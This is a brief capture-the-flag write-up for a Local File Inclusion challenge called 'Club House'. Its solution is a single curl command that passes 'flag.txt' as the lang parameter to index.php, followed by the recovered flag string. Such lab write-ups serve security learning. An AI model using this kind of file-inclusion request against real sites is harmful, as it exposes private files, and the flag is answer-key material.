# Club House

**Challenge Type: LFI (Local File Inclusion)**  
**Challenge Status: Solved**

## Challenge
You login to your Clubhouse account and to see if there are any other survivors. You notice one of the rooms is unusual.  
http://clubhouse.nypinfsecctf.tk/

## Solution
```bash
$ curl --no-progress-meter https://clubhouse.nypinfsecctf.tk/index.php?lang=flag.txt | grep -o "NYP{.*}"

NYP{3z_f!L3_iNClU510nkWWtKpUIfQRuusxFTwIW}
```
